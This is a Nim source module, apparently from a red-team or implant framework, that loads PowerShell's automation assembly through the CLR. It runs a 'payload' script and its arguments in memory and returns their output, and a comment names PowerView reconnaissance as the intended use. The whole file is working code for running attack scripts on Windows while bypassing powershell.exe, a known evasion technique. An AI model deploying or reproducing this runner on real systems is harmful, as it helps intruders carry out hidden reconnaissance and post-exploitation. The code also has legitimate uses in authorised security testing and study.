import winim/clr
import ../rth
import ../utils/utils


#[
  Executes a powershell script via COM in-memory.
  It will add the script and then execute the given
  arguments afterwards.
]#

proc execute*(payload: var Payload): bool =

  var powershellScript = cast[string](payload.bytes)

  # System.Management.Automation and RunSpace Factory
  DBG("[*] Opening/Loading Automation/Runspace")

  var Automation = load("System.Management.Automation")
  var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
  var runspace = @RunspaceFactory.CreateRunspace()
  runspace.Open()
  var pipeline = runspace.CreatePipeline()


  # Load the script first and the the PowerView Command
  if len(payload.bytes) >= 1:
    DBG("[*] Adding Payload")
    discard pipeline.Commands.AddScript(powershellScript)


  for argument in payload.arguments:
    DBG("Adding: " & argument)
    discard pipeline.Commands.AddScript(argument)

  discard pipeline.Commands.Add("Out-String")

  try:
    var results = pipeline.Invoke()
    for i in countUp(0,results.Count()-1):
      DBG($(results.Item(i)))
      payload.output &= $(results.Item(i))
  except:
    DBG("[-] Invalid Powershell Cmdlet")
    discard runspace.Close()
    return false

  discard runspace.Close()
  return true
